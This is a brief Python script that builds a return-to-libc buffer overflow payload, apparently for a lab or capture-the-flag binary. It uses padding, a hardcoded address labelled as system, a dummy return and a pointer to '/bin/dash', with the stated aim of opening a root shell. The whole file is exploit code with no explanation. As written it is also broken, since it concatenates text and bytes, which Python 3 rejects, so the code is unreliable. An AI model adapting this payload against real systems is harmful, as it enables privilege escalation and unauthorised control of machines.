import sys
from struct import pack

#Need to run /bin/sh and open a root shell
filler = "D"*22
ret= 0x0804ef50.to_bytes(4, "little")#start of systemx
dummy_ret = "f"*4
arg= 0xbffefaa8.to_bytes(4, "little") #wherever shell code string is
command = "/bin/dash"
print (filler + ret + dummy_ret + arg + command)